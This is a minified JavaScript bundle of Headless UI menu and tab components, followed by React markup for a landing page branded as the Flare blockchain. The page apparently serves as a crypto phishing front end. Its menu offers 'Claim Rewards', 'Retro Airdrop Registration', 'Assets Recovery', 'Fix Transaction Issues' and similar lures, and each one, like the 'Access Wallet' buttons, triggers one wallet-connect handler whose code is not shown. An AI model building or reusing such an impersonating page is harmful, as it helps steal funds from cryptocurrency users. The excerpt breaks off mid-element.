                    r = e.searchQuery + t.value.toLowerCase(),
                    i = (e.activeItemIndex !== null ? e.items.slice(e.activeItemIndex + n).concat(e.items.slice(0, e.activeItemIndex + n)) : e.items).find(s => {
                        var a;
                        return ((a = s.dataRef.current.textValue) == null ? void 0 : a.startsWith(r)) && !s.dataRef.current.disabled
                    }),
                    o = i ? e.items.indexOf(i) : -1;
                return o === -1 || o === e.activeItemIndex ? { ...e,
                    searchQuery: r
                } : { ...e,
                    searchQuery: r,
                    activeItemIndex: o,
                    activationTrigger: 1
                }
            },
            4(e) {
                return e.searchQuery === "" ? e : { ...e,
                    searchQuery: "",
                    searchActiveItemIndex: null
                }
            },
            5: (e, t) => {
                let n = Kf(e, r => [...r, {
                    id: t.id,
                    dataRef: t.dataRef
                }]);
                return { ...e,
                    ...n
                }
            },
            6: (e, t) => {
                let n = Kf(e, r => {
                    let i = r.findIndex(o => o.id === t.id);
                    return i !== -1 && r.splice(i, 1), r
                });
                return { ...e,
                    ...n,
                    activationTrigger: 1
                }
            },
            7: (e, t) => e.buttonElement === t.element ? e : { ...e,
                buttonElement: t.element
            },
            8: (e, t) => e.itemsElement === t.element ? e : { ...e,
                itemsElement: t.element
            }
        },
        p0 = b.createContext(null);
    p0.displayName = "MenuContext";

    function Hd(e) {
        let t = b.useContext(p0);
        if (t === null) {
            let n = new Error(`<${e} /> is missing a parent <Menu /> component.`);
            throw Error.captureStackTrace && Error.captureStackTrace(n, Hd), n
        }
        return t
    }

    function D3(e, t) {
        return Et(t.type, F3, e, t)
    }
    let j3 = b.Fragment;

    function H3(e, t) {
        let {
            __demoMode: n = !1,
            ...r
        } = e, i = b.useReducer(D3, {
            __demoMode: n,
            menuState: n ? 0 : 1,
            buttonElement: null,
            itemsElement: null,
            items: [],
            searchQuery: "",
            activeItemIndex: null,
            activationTrigger: 1
        }), [{
            menuState: o,
            itemsElement: s,
            buttonElement: a
        }, l] = i, u = We(t);
        Qb(o === 0, [a, s], (v, p) => {
            l({
                type: 1
            }), o0(p, i0.Loose) || (v.preventDefault(), a == null || a.focus())
        });
        let c = J(() => {
                l({
                    type: 1
                })
            }),
            d = b.useMemo(() => ({
                open: o === 0,
                close: c
            }), [o, c]),
            f = {
                ref: u
            },
            h = Pe();
        return q.createElement(LI, null, q.createElement(p0.Provider, {
            value: i
        }, q.createElement(mx, {
            value: Et(o, {
                0: wt.Open,
                1: wt.Closed
            })
        }, h({
            ourProps: f,
            theirProps: r,
            slot: d,
            defaultTag: j3,
            name: "Menu"
        }))))
    }
    let $3 = "button";

    function U3(e, t) {
        var n;
        let r = b.useId(),
            {
                id: i = `headlessui-menu-button-${r}`,
                disabled: o = !1,
                autoFocus: s = !1,
                ...a
            } = e,
            [l, u] = Hd("Menu.Button"),
            c = BI(),
            d = We(t, NI(), J(I => u({
                type: 7,
                element: I
            }))),
            f = J(I => {
                switch (I.key) {
                    case Ee.Space:
                    case Ee.Enter:
                    case Ee.ArrowDown:
                        I.preventDefault(), I.stopPropagation(), Sn.flushSync(() => u({
                            type: 0
                        })), u({
                            type: 2,
                            focus: ft.First
                        });
                        break;
                    case Ee.ArrowUp:
                        I.preventDefault(), I.stopPropagation(), Sn.flushSync(() => u({
                            type: 0
                        })), u({
                            type: 2,
                            focus: ft.Last
                        });
                        break
                }
            }),
            h = J(I => {
                switch (I.key) {
                    case Ee.Space:
                        I.preventDefault();
                        break
                }
            }),
            v = J(I => {
                var _;
                if ($k(I.currentTarget)) return I.preventDefault();
                o || (l.menuState === 0 ? (Sn.flushSync(() => u({
                    type: 1
                })), (_ = l.buttonElement) == null || _.focus({
                    preventScroll: !0
                })) : (I.preventDefault(), u({
                    type: 0
                })))
            }),
            {
                isFocusVisible: p,
                focusProps: w
            } = t0({
                autoFocus: s
            }),
            {
                isHovered: m,
                hoverProps: g
            } = Nb({
                isDisabled: o
            }),
            {
                pressed: y,
                pressProps: x
            } = Bb({
                disabled: o
            }),
            E = b.useMemo(() => ({
                open: l.menuState === 0,
                active: y || l.menuState === 0,
                disabled: o,
                hover: m,
                focus: p,
                autofocus: s
            }), [l, m, p, y, o, s]),
            k = Id(c(), {
                ref: d,
                id: i,
                type: Zb(e, l.buttonElement),
                "aria-haspopup": "menu",
                "aria-controls": (n = l.itemsElement) == null ? void 0 : n.id,
                "aria-expanded": l.menuState === 0,
                disabled: o || void 0,
                autoFocus: s,
                onKeyDown: f,
                onKeyUp: h,
                onClick: v
            }, w, g, x);
        return Pe()({
            ourProps: k,
            theirProps: a,
            slot: E,
            defaultTag: $3,
            name: "Menu.Button"
        })
    }
    let z3 = "div",
        G3 = ii.RenderStrategy | ii.Static;

    function V3(e, t) {
        var n, r;
        let i = b.useId(),
            {
                id: o = `headlessui-menu-items-${i}`,
                anchor: s,
                portal: a = !1,
                modal: l = !0,
                transition: u = !1,
                ...c
            } = e,
            d = RI(s),
            [f, h] = Hd("Menu.Items"),
            [v, p] = OI(d),
            w = MI(),
            [m, g] = b.useState(null),
            y = We(t, d ? v : null, J(T => h({
                type: 8,
                element: T
            })), g),
            x = Ls(f.itemsElement);
        d && (a = !0);
        let E = Dl(),
            [k, I] = Xb(u, m, E !== null ? (E & wt.Open) === wt.Open : f.menuState === 0);
        zb(k, f.buttonElement, () => {
            h({
                type: 1
            })
        });
        let _ = f.__demoMode ? !1 : l && f.menuState === 0;
        Yb(_, x);
        let L = f.__demoMode ? !1 : l && f.menuState === 0;
        Ub(L, {
            allowed: b.useCallback(() => [f.buttonElement, f.itemsElement], [f.buttonElement, f.itemsElement])
        });
        let C = f.menuState !== 0,
            M = R3(C, f.buttonElement) ? !1 : k;
        b.useEffect(() => {
            let T = f.itemsElement;
            T && f.menuState === 0 && T !== (x == null ? void 0 : x.activeElement) && T.focus({
                preventScroll: !0
            })
        }, [f.menuState, f.itemsElement, x]), ST(f.menuState === 0, {
            container: f.itemsElement,
            accept(T) {
                return T.getAttribute("role") === "menuitem" ? NodeFilter.FILTER_REJECT : T.hasAttribute("role") ? NodeFilter.FILTER_SKIP : NodeFilter.FILTER_ACCEPT
            },
            walk(T) {
                T.setAttribute("role", "none")
            }
        });
        let F = Ms(),
            U = J(T => {
                var B, R, $;
                switch (F.dispose(), T.key) {
                    case Ee.Space:
                        if (f.searchQuery !== "") return T.preventDefault(), T.stopPropagation(), h({
                            type: 3,
                            value: T.key
                        });
                    case Ee.Enter:
                        if (T.preventDefault(), T.stopPropagation(), h({
                                type: 1
                            }), f.activeItemIndex !== null) {
                            let {
                                dataRef: Z
                            } = f.items[f.activeItemIndex];
                            (R = (B = Z.current) == null ? void 0 : B.domRef.current) == null || R.click()
                        }
                        Vb(f.buttonElement);
                        break;
                    case Ee.ArrowDown:
                        return T.preventDefault(), T.stopPropagation(), h({
                            type: 2,
                            focus: ft.Next
                        });
                    case Ee.ArrowUp:
                        return T.preventDefault(), T.stopPropagation(), h({
                            type: 2,
                            focus: ft.Previous
                        });
                    case Ee.Home:
                    case Ee.PageUp:
                        return T.preventDefault(), T.stopPropagation(), h({
                            type: 2,
                            focus: ft.First
                        });
                    case Ee.End:
                    case Ee.PageDown:
                        return T.preventDefault(), T.stopPropagation(), h({
                            type: 2,
                            focus: ft.Last
                        });
                    case Ee.Escape:
                        T.preventDefault(), T.stopPropagation(), Sn.flushSync(() => h({
                            type: 1
                        })), ($ = f.buttonElement) == null || $.focus({
                            preventScroll: !0
                        });
                        break;
                    case Ee.Tab:
                        T.preventDefault(), T.stopPropagation(), Sn.flushSync(() => h({
                            type: 1
                        })), uT(f.buttonElement, T.shiftKey ? He.Previous : He.Next);
                        break;
                    default:
                        T.key.length === 1 && (h({
                            type: 3,
                            value: T.key
                        }), F.setTimeout(() => h({
                            type: 4
                        }), 350));
                        break
                }
            }),
            Q = J(T => {
                switch (T.key) {
                    case Ee.Space:
                        T.preventDefault();
                        break
                }
            }),
            A = b.useMemo(() => ({
                open: f.menuState === 0
            }), [f.menuState]),
            P = Id(d ? w() : {}, {
                "aria-activedescendant": f.activeItemIndex === null || (n = f.items[f.activeItemIndex]) == null ? void 0 : n.id,
                "aria-labelledby": (r = f.buttonElement) == null ? void 0 : r.id,
                id: o,
                onKeyDown: U,
                onKeyUp: Q,
                role: "menu",
                tabIndex: f.menuState === 0 ? 0 : void 0,
                ref: y,
                style: { ...c.style,
                    ...p,
                    "--button-width": tT(f.buttonElement, !0).width
                },
                ...Jb(I)
            }),
            O = Pe();
        return q.createElement(xx, {
            enabled: a ? e.static || k : !1
        }, O({
            ourProps: P,
            theirProps: c,
            slot: A,
            defaultTag: z3,
            features: G3,
            visible: M,
            name: "Menu.Items"
        }))
    }
    let W3 = b.Fragment;

    function q3(e, t) {
        let n = b.useId(),
            {
                id: r = `headlessui-menu-item-${n}`,
                disabled: i = !1,
                ...o
            } = e,
            [s, a] = Hd("Menu.Item"),
            l = s.activeItemIndex !== null ? s.items[s.activeItemIndex].id === r : !1,
            u = b.useRef(null),
            c = We(t, u);
        ve(() => {
            if (!s.__demoMode && s.menuState === 0 && l && s.activationTrigger !== 0) return Yn().requestAnimationFrame(() => {
                var M, F;
                (F = (M = u.current) == null ? void 0 : M.scrollIntoView) == null || F.call(M, {
                    block: "nearest"
                })
            })
        }, [s.__demoMode, u, l, s.menuState, s.activationTrigger, s.activeItemIndex]);
        let d = B3(u),
            f = b.useRef({
                disabled: i,
                domRef: u,
                get textValue() {
                    return d()
                }
            });
        ve(() => {
            f.current.disabled = i
        }, [f, i]), ve(() => (a({
            type: 5,
            id: r,
            dataRef: f
        }), () => a({
            type: 6,
            id: r
        })), [f, r]);
        let h = J(() => {
                a({
                    type: 1
                })
            }),
            v = J(M => {
                if (i) return M.preventDefault();
                a({
                    type: 1
                }), Vb(s.buttonElement)
            }),
            p = J(() => {
                if (i) return a({
                    type: 2,
                    focus: ft.Nothing
                });
                a({
                    type: 2,
                    focus: ft.Specific,
                    id: r
                })
            }),
            w = yT(),
            m = J(M => {
                w.update(M), !i && (l || a({
                    type: 2,
                    focus: ft.Specific,
                    id: r,
                    trigger: 0
                }))
            }),
            g = J(M => {
                w.wasMoved(M) && (i || l || a({
                    type: 2,
                    focus: ft.Specific,
                    id: r,
                    trigger: 0
                }))
            }),
            y = J(M => {
                w.wasMoved(M) && (i || l && a({
                    type: 2,
                    focus: ft.Nothing
                }))
            }),
            [x, E] = jb(),
            [k, I] = Db(),
            _ = b.useMemo(() => ({
                active: l,
                focus: l,
                disabled: i,
                close: h
            }), [l, i, h]),
            L = {
                id: r,
                ref: c,
                role: "menuitem",
                tabIndex: i === !0 ? void 0 : -1,
                "aria-disabled": i === !0 ? !0 : void 0,
                "aria-labelledby": x,
                "aria-describedby": k,
                disabled: void 0,
                onClick: v,
                onFocus: p,
                onPointerEnter: m,
                onMouseEnter: m,
                onPointerMove: g,
                onMouseMove: g,
                onPointerLeave: y,
                onMouseLeave: y
            },
            C = Pe();
        return q.createElement(E, null, q.createElement(I, null, C({
            ourProps: L,
            theirProps: o,
            slot: _,
            defaultTag: W3,
            name: "Menu.Item"
        })))
    }
    let Q3 = "div";

    function K3(e, t) {
        let [n, r] = jb(), i = e, o = {
            ref: t,
            "aria-labelledby": n,
            role: "group"
        }, s = Pe();
        return q.createElement(r, null, s({
            ourProps: o,
            theirProps: i,
            slot: {},
            defaultTag: Q3,
            name: "Menu.Section"
        }))
    }
    let Z3 = "header";

    function Y3(e, t) {
        let n = b.useId(),
            {
                id: r = `headlessui-menu-heading-${n}`,
                ...i
            } = e,
            o = r0();
        ve(() => o.register(r), [r, o.register]);
        let s = {
            id: r,
            ref: t,
            role: "presentation",
            ...o.props
        };
        return Pe()({
            ourProps: s,
            theirProps: i,
            slot: {},
            defaultTag: Z3,
            name: "Menu.Heading"
        })
    }
    let J3 = "div";

    function X3(e, t) {
        let n = e,
            r = {
                ref: t,
                role: "separator"
            };
        return Pe()({
            ourProps: r,
            theirProps: n,
            slot: {},
            defaultTag: J3,
            name: "Menu.Separator"
        })
    }
    let e5 = _e(H3),
        Rx = _e(U3),
        Nx = _e(V3),
        bp = _e(q3),
        t5 = _e(K3),
        n5 = _e(Y3),
        r5 = _e(X3),
        i5 = Object.assign(e5, {
            Button: Rx,
            Items: Nx,
            Item: bp,
            Section: t5,
            Heading: n5,
            Separator: r5
        });

    function o5({
        onFocus: e
    }) {
        let [t, n] = b.useState(!0), r = Od();
        return t ? q.createElement(Ja, {
            as: "button",
            type: "button",
            features: Ya.Focusable,
            onFocus: i => {
                i.preventDefault();
                let o, s = 50;

                function a() {
                    if (s-- <= 0) {
                        o && cancelAnimationFrame(o);
                        return
                    }
                    if (e()) {
                        if (cancelAnimationFrame(o), !r.current) return;
                        n(!1);
                        return
                    }
                    o = requestAnimationFrame(a)
                }
                o = requestAnimationFrame(a)
            }
        }) : null
    }
    const Bx = b.createContext(null);

    function s5() {
        return {
            groups: new Map,
            get(e, t) {
                var n;
                let r = this.groups.get(e);
                r || (r = new Map, this.groups.set(e, r));
                let i = (n = r.get(t)) != null ? n : 0;
                r.set(t, i + 1);
                let o = Array.from(r.keys()).indexOf(t);

                function s() {
                    let a = r.get(t);
                    a > 1 ? r.set(t, a - 1) : r.delete(t)
                }
                return [o, s]
            }
        }
    }

    function a5({
        children: e
    }) {
        let t = b.useRef(s5());
        return b.createElement(Bx.Provider, {
            value: t
        }, e)
    }

    function Mx(e) {
        let t = b.useContext(Bx);
        if (!t) throw new Error("You must wrap your component in a <StableCollection>");
        let n = b.useId(),
            [r, i] = t.current.get(e, n);
        return b.useEffect(() => i, []), r
    }
    var l5 = (e => (e[e.Forwards = 0] = "Forwards", e[e.Backwards = 1] = "Backwards", e))(l5 || {}),
        c5 = (e => (e[e.Less = -1] = "Less", e[e.Equal = 0] = "Equal", e[e.Greater = 1] = "Greater", e))(c5 || {}),
        u5 = (e => (e[e.SetSelectedIndex = 0] = "SetSelectedIndex", e[e.RegisterTab = 1] = "RegisterTab", e[e.UnregisterTab = 2] = "UnregisterTab", e[e.RegisterPanel = 3] = "RegisterPanel", e[e.UnregisterPanel = 4] = "UnregisterPanel", e))(u5 || {});
    let d5 = {
            0(e, t) {
                var n;
                let r = Mi(e.tabs, c => c.current),
                    i = Mi(e.panels, c => c.current),
                    o = r.filter(c => {
                        var d;
                        return !((d = c.current) != null && d.hasAttribute("disabled"))
                    }),
                    s = { ...e,
                        tabs: r,
                        panels: i
                    };
                if (t.index < 0 || t.index > r.length - 1) {
                    let c = Et(Math.sign(t.index - e.selectedIndex), {
                        [-1]: () => 1,
                        0: () => Et(Math.sign(t.index), {
                            [-1]: () => 0,
                            0: () => 0,
                            1: () => 1
                        }),
                        1: () => 0
                    });
                    if (o.length === 0) return s;
                    let d = Et(c, {
                        0: () => r.indexOf(o[0]),
                        1: () => r.indexOf(o[o.length - 1])
                    });
                    return { ...s,
                        selectedIndex: d === -1 ? e.selectedIndex : d
                    }
                }
                let a = r.slice(0, t.index),
                    l = [...r.slice(t.index), ...a].find(c => o.includes(c));
                if (!l) return s;
                let u = (n = r.indexOf(l)) != null ? n : e.selectedIndex;
                return u === -1 && (u = e.selectedIndex), { ...s,
                    selectedIndex: u
                }
            },
            1(e, t) {
                if (e.tabs.includes(t.tab)) return e;
                let n = e.tabs[e.selectedIndex],
                    r = Mi([...e.tabs, t.tab], o => o.current),
                    i = e.selectedIndex;
                return e.info.current.isControlled || (i = r.indexOf(n), i === -1 && (i = e.selectedIndex)), { ...e,
                    tabs: r,
                    selectedIndex: i
                }
            },
            2(e, t) {
                return { ...e,
                    tabs: e.tabs.filter(n => n !== t.tab)
                }
            },
            3(e, t) {
                return e.panels.includes(t.panel) ? e : { ...e,
                    panels: Mi([...e.panels, t.panel], n => n.current)
                }
            },
            4(e, t) {
                return { ...e,
                    panels: e.panels.filter(n => n !== t.panel)
                }
            }
        },
        m0 = b.createContext(null);
    m0.displayName = "TabsDataContext";

    function fs(e) {
        let t = b.useContext(m0);
        if (t === null) {
            let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
            throw Error.captureStackTrace && Error.captureStackTrace(n, fs), n
        }
        return t
    }
    let g0 = b.createContext(null);
    g0.displayName = "TabsActionsContext";

    function v0(e) {
        let t = b.useContext(g0);
        if (t === null) {
            let n = new Error(`<${e} /> is missing a parent <Tab.Group /> component.`);
            throw Error.captureStackTrace && Error.captureStackTrace(n, v0), n
        }
        return t
    }

    function f5(e, t) {
        return Et(t.type, d5, e, t)
    }
    let h5 = "div";

    function p5(e, t) {
        let {
            defaultIndex: n = 0,
            vertical: r = !1,
            manual: i = !1,
            onChange: o,
            selectedIndex: s = null,
            ...a
        } = e;
        const l = r ? "vertical" : "horizontal",
            u = i ? "manual" : "auto";
        let c = s !== null,
            d = xn({
                isControlled: c
            }),
            f = We(t),
            [h, v] = b.useReducer(f5, {
                info: d,
                selectedIndex: s ?? n,
                tabs: [],
                panels: []
            }),
            p = b.useMemo(() => ({
                selectedIndex: h.selectedIndex
            }), [h.selectedIndex]),
            w = xn(o || (() => {})),
            m = xn(h.tabs),
            g = b.useMemo(() => ({
                orientation: l,
                activation: u,
                ...h
            }), [l, u, h]),
            y = J(C => (v({
                type: 1,
                tab: C
            }), () => v({
                type: 2,
                tab: C
            }))),
            x = J(C => (v({
                type: 3,
                panel: C
            }), () => v({
                type: 4,
                panel: C
            }))),
            E = J(C => {
                k.current !== C && w.current(C), c || v({
                    type: 0,
                    index: C
                })
            }),
            k = xn(c ? e.selectedIndex : h.selectedIndex),
            I = b.useMemo(() => ({
                registerTab: y,
                registerPanel: x,
                change: E
            }), []);
        ve(() => {
            v({
                type: 0,
                index: s ?? n
            })
        }, [s]), ve(() => {
            if (k.current === void 0 || h.tabs.length <= 0) return;
            let C = Mi(h.tabs, M => M.current);
            C.some((M, F) => h.tabs[F] !== M) && E(C.indexOf(h.tabs[k.current]))
        });
        let _ = {
                ref: f
            },
            L = Pe();
        return q.createElement(a5, null, q.createElement(g0.Provider, {
            value: I
        }, q.createElement(m0.Provider, {
            value: g
        }, g.tabs.length <= 0 && q.createElement(o5, {
            onFocus: () => {
                var C, M;
                for (let F of m.current)
                    if (((C = F.current) == null ? void 0 : C.tabIndex) === 0) return (M = F.current) == null || M.focus(), !0;
                return !1
            }
        }), L({
            ourProps: _,
            theirProps: a,
            slot: p,
            defaultTag: h5,
            name: "Tabs"
        }))))
    }
    let m5 = "div";

    function g5(e, t) {
        let {
            orientation: n,
            selectedIndex: r
        } = fs("Tab.List"), i = We(t), o = b.useMemo(() => ({
            selectedIndex: r
        }), [r]), s = e, a = {
            ref: i,
            role: "tablist",
            "aria-orientation": n
        };
        return Pe()({
            ourProps: a,
            theirProps: s,
            slot: o,
            defaultTag: m5,
            name: "Tabs.List"
        })
    }
    let v5 = "button";

    function y5(e, t) {
        var n, r;
        let i = b.useId(),
            {
                id: o = `headlessui-tabs-tab-${i}`,
                disabled: s = !1,
                autoFocus: a = !1,
                ...l
            } = e,
            {
                orientation: u,
                activation: c,
                selectedIndex: d,
                tabs: f,
                panels: h
            } = fs("Tab"),
            v = v0("Tab"),
            p = fs("Tab"),
            [w, m] = b.useState(null),
            g = b.useRef(null),
            y = We(g, t, m);
        ve(() => v.registerTab(g), [v, g]);
        let x = Mx("tabs"),
            E = f.indexOf(g);
        E === -1 && (E = x);
        let k = E === d,
            I = J(R => {
                var $;
                let Z = R();
                if (Z === Bi.Success && c === "auto") {
                    let ie = ($ = mi(g)) == null ? void 0 : $.activeElement,
                        be = p.tabs.findIndex(ze => ze.current === ie);
                    be !== -1 && v.change(be)
                }
                return Z
            }),
            _ = J(R => {
                let $ = f.map(Z => Z.current).filter(Boolean);
                if (R.key === Ee.Space || R.key === Ee.Enter) {
                    R.preventDefault(), R.stopPropagation(), v.change(E);
                    return
                }
                switch (R.key) {
                    case Ee.Home:
                    case Ee.PageUp:
                        return R.preventDefault(), R.stopPropagation(), I(() => ln($, He.First));
                    case Ee.End:
                    case Ee.PageDown:
                        return R.preventDefault(), R.stopPropagation(), I(() => ln($, He.Last))
                }
                if (I(() => Et(u, {
                        vertical() {
                            return R.key === Ee.ArrowUp ? ln($, He.Previous | He.WrapAround) : R.key === Ee.ArrowDown ? ln($, He.Next | He.WrapAround) : Bi.Error
                        },
                        horizontal() {
                            return R.key === Ee.ArrowLeft ? ln($, He.Previous | He.WrapAround) : R.key === Ee.ArrowRight ? ln($, He.Next | He.WrapAround) : Bi.Error
                        }
                    })) === Bi.Success) return R.preventDefault()
            }),
            L = b.useRef(!1),
            C = J(() => {
                var R;
                L.current || (L.current = !0, (R = g.current) == null || R.focus({
                    preventScroll: !0
                }), v.change(E), Ol(() => {
                    L.current = !1
                }))
            }),
            M = J(R => {
                R.preventDefault()
            }),
            {
                isFocusVisible: F,
                focusProps: U
            } = t0({
                autoFocus: a
            }),
            {
                isHovered: Q,
                hoverProps: A
            } = Nb({
                isDisabled: s
            }),
            {
                pressed: P,
                pressProps: O
            } = Bb({
                disabled: s
            }),
            T = b.useMemo(() => ({
                selected: k,
                hover: Q,
                active: P,
                focus: F,
                autofocus: a,
                disabled: s
            }), [k, Q, F, P, a, s]),
            B = Id({
                ref: y,
                onKeyDown: _,
                onMouseDown: M,
                onClick: C,
                id: o,
                role: "tab",
                type: Zb(e, w),
                "aria-controls": (r = (n = h[E]) == null ? void 0 : n.current) == null ? void 0 : r.id,
                "aria-selected": k,
                tabIndex: k ? 0 : -1,
                disabled: s || void 0,
                autoFocus: a
            }, U, A, O);
        return Pe()({
            ourProps: B,
            theirProps: l,
            slot: T,
            defaultTag: v5,
            name: "Tabs.Tab"
        })
    }
    let w5 = "div";

    function b5(e, t) {
        let {
            selectedIndex: n
        } = fs("Tab.Panels"), r = We(t), i = b.useMemo(() => ({
            selectedIndex: n
        }), [n]), o = e, s = {
            ref: r
        };
        return Pe()({
            ourProps: s,
            theirProps: o,
            slot: i,
            defaultTag: w5,
            name: "Tabs.Panels"
        })
    }
    let x5 = "div",
        E5 = ii.RenderStrategy | ii.Static;

    function A5(e, t) {
        var n, r, i, o;
        let s = b.useId(),
            {
                id: a = `headlessui-tabs-panel-${s}`,
                tabIndex: l = 0,
                ...u
            } = e,
            {
                selectedIndex: c,
                tabs: d,
                panels: f
            } = fs("Tab.Panel"),
            h = v0("Tab.Panel"),
            v = b.useRef(null),
            p = We(v, t);
        ve(() => h.registerPanel(v), [h, v]);
        let w = Mx("panels"),
            m = f.indexOf(v);
        m === -1 && (m = w);
        let g = m === c,
            {
                isFocusVisible: y,
                focusProps: x
            } = t0(),
            E = b.useMemo(() => ({
                selected: g,
                focus: y
            }), [g, y]),
            k = Id({
                ref: p,
                id: a,
                role: "tabpanel",
                "aria-labelledby": (r = (n = d[m]) == null ? void 0 : n.current) == null ? void 0 : r.id,
                tabIndex: g ? l : -1
            }, x),
            I = Pe();
        return !g && ((i = u.unmount) == null || i) && !((o = u.static) != null && o) ? q.createElement(Ja, {
            "aria-hidden": "true",
            ...k
        }) : I({
            ourProps: k,
            theirProps: u,
            slot: E,
            defaultTag: x5,
            features: E5,
            visible: g,
            name: "Tabs.Panel"
        })
    }
    let _5 = _e(y5),
        S5 = _e(p5),
        k5 = _e(g5),
        T5 = _e(b5),
        I5 = _e(A5),
        wi = Object.assign(_5, {
            Group: S5,
            List: k5,
            Panels: T5,
            Panel: I5
        });
    const Ti = (...e) => e.filter(Boolean).join(" "),
        gr = ({
            label: e,
            color: t = "primary",
            variant: n = "filled",
            children: r,
            onClick: i,
            type: o = "button",
            className: s
        }) => {
            const a = "relative inline-flex items-center justify-center p-0.5 overflow-hidden text-sm rounded-full focus:ring-4 focus:outline-none transition-all",
                l = {
                    filled: {
                        accent: "bg-accent text-white hover:bg-transparent hover:text-accent focus:ring-accent/10 border border-accent",
                        primary: "bg-primary text-white hover:bg-gray-800 focus:ring-gray-500 border border-primary"
                    },
                    outlined: {
                        accent: "bg-transparent text-accent border border-accent focus:ring-accent/50",
                        primary: "bg-transparent text-primary border border-primary focus:ring-primary/50"
                    }
                },
                u = l[n][t] || l.filled.accent;
            return S.jsx("button", {
                type: o,
                onClick: i,
                className: Ti(a, u, s),
                children: S.jsx("span", {
                    className: "relative px-8 py-4 leading-none",
                    children: e || r
                })
            })
        },
        C5 = ({
            onConnect: e
        }) => S.jsx("header", {
            className: "sticky top-0 left-0 right-0 z-[2] bg-white",
            children: S.jsxs("nav", {
                className: "flex items-center h-16 justify-between mx-auto px-3 md:px-6 py-2",
                children: [S.jsx("a", {
                    href: "#",
                    className: "flex items-center gap-2",
                    children: S.jsx("img", {
                        src: "/flare-logo.svg",
                        className: "h-8 w-auto"
                    })
                }), S.jsx(i5, {
                    as: "div",
                    className: "inline-block text-left",
                    children: ({
                        open: t
                    }) => S.jsxs(S.Fragment, {
                        children: [S.jsx(Rx, {
                            as: "button",
                            className: "inline-flex items-center focus:outline-none text-accent",
                            children: t ? S.jsx("svg", {
                                xmlns: "http://www.w3.org/2000/svg",
                                viewBox: "0 0 24 24",
                                className: "h-8 w-8",
                                fill: "currentColor",
                                children: S.jsx("path", {
                                    d: "M13.46,12L19,17.54V19H17.54L12,13.46L6.46,19H5V17.54L10.54,12L5,6.46V5H6.46L12,10.54L17.54,5H19V6.46L13.46,12Z"
                                })
                            }) : S.jsx("svg", {
                                xmlns: "http://www.w3.org/2000/svg",
                                viewBox: "0 0 24 24",
                                className: "h-8 w-8",
                                fill: "currentColor",
                                children: S.jsx("path", {
                                    d: "M3,6H21V8H3V6M3,11H21V13H3V11M3,16H21V18H3V16Z"
                                })
                            })
                        }), S.jsx(ot, {
                            as: b.Fragment,
                            enter: "transition ease-out duration-100",
                            enterFrom: "transform opacity-0 scale-95",
                            enterTo: "transform opacity-100 scale-100",
                            leave: "transition ease-in duration-75",
                            leaveFrom: "transform opacity-100 scale-100",
                            leaveTo: "transform opacity-0 scale-95",
                            children: S.jsx(Nx, {
                                as: "div",
                                className: Ti("absolute right-0 left-0", "divide-y divide-gray-200 bg-white h-[100vh] shadow-lg", "mt-2.5 w-full py-6 z-[5] focus:outline-none"),
                                children: S.jsxs("div", {
                                    className: "flex flex-col gap-3 px-4",
                                    children: [
                                        ["Switch to FTSO v2", "Claim Rewards", "Fix FAssets mint", "Retro Airdrop Registration", "Assets Recovery", "Fix Transaction Issues", "Restore Full Functionality"].map(n => S.jsxs(bp, {
                                            as: "button",
                                            type: "button",
                                            className: "flex justify-between text-left py-2.5 px-6 text-base hover:underline transition-all ease-in duration-200",
                                            onClick: e,
                                            children: [n, S.jsx("svg", {
                                                xmlns: "http://www.w3.org/2000/svg",
                                                viewBox: "0 0 24 24",
                                                className: "fill-stone-400 h-6 w-6",
                                                children: S.jsx("path", {
                                                    d: "M7.41,8.58L12,13.17L16.59,8.58L18,10L12,16L6,10L7.41,8.58Z"
                                                })
                                            })]
                                        }, n)), S.jsx(bp, {
                                            as: gr,
                                            className: "w-full",
                                            onClick: e,
                                            children: "Access Wallet"
                                        })
                                    ]
                                })
                            })
                        })]
                    })
                })]
            })
        }),
        P5 = ({
            onConnect: e
        }) => S.jsx("section", {
            className: "my-8",
            children: S.jsxs("div", {
                className: "max-w-screen-lg p-4 mx-auto text-center bg-gradient-to-br from-purple-400 via-pink-400 to-accent/40 text-transparent bg-clip-text",
                children: [S.jsx("h2", {
                    className: "text-6xl md:text-8xl font-black",
                    children: "Connect Everything."
                }), S.jsx("p", {
                    className: "text-2xl md:text-4xl font-semibold mt-8 mb-10",
                    children: "Flare is the blockchain for data, providing developers with secure decentralized access to high-integrity data from other chains and the internet."
                }), S.jsx("div", {
                    className: "inline-flex gap-2 items-center",
                    children: S.jsx(gr, {
                        label: "Access Wallet",
                        color: "accent",
                        className: "min-w-60",
                        onClick: e
                    })
                })]
            })
        }),
        R5 = ({
            onConnect: e
        }) => {
            const t = [{
                    image: "/images/bmi-banner.png",
                    title: "Effortless Node Deployment: Flare's Blockchain Machine Images now live on Google",
                    tags: "Ecosystem news"
                }, {
                    image: "/images/FAssets-doge-support.png",
                    title: "Doge comes to FAssets Open Beta",
                    tags: "Flare Updates"
                }, {
                    image: "/images/RDT.png",
                    title: "Flare and Red Date introduce new decentralized KYC solution in Hong Kong",
                    tags: "Flare Updates"
                }],
                n = [
                    ["Decentralized Bridging", "Trustly access value and users from other chains."],
                    ["State Acquisition", "Build dapps and protocols that utilize state from any connected chain."],
                    ["Web2 Connectivity", "Trustly trigger smart contracts with data from web2 APIs."],
                    ["Enshrined Oracles", "Access all the data you need knowing Flare's oracles are secured at the network layer."],
                    ["Data Access For Free", "Build on Flare with a broad range of data feeds available on-chain for free."]
                ];
            return S.jsxs(S.Fragment, {
                children: [S.jsxs("section", {
                    className: "p-4 md:p-8 my-12 max-w-screen-xl mx-auto",
                    children: [S.jsx("h3", {
                        className: "text-center text-3xl md:text-4xl font-bold",
                        children: "The blockchain for data"
                    }), S.jsx("p", {
                        className: "text-stone-400 mt-2 text-center text-lg md:text-2xl",
                        children: "Flare is an EVM smart contract platform with two enshrined data acquisition protocols."
                    }), S.jsx("div", {
                        className: "max-w-screen-md mx-auto grid grid-cols-1 md:grid-cols-2 gap-2 md:gap-8 mt-6",
                        children: [
                            ["FTSO", "Decentralized Prices"],
                            ["Data Connector", "Trustless data proofs"]
                        ].map(r => S.jsxs("div", {
                            className: "rounded-2xl bg-primary text-stone-400 flex flex-col gap-2 py-8 px-4 text-center",
                            children: [S.jsx("img", {
                                src: "/images/ftso.svg",
                                className: "h-20 w-20 mx-auto"
                            }), S.jsxs("h4", {
                                className: "font-semibold text-base md:text-lg mt-4 text-white",
                                children: [r[0], " ", S.jsx("br", {}), " ", S.jsx("span", {
                                    className: "text-stone-400",
                                    children: r[1]
                                })]
                            }), S.jsx("p", {
                                className: "text-stone-400 text-sm md:text-base",
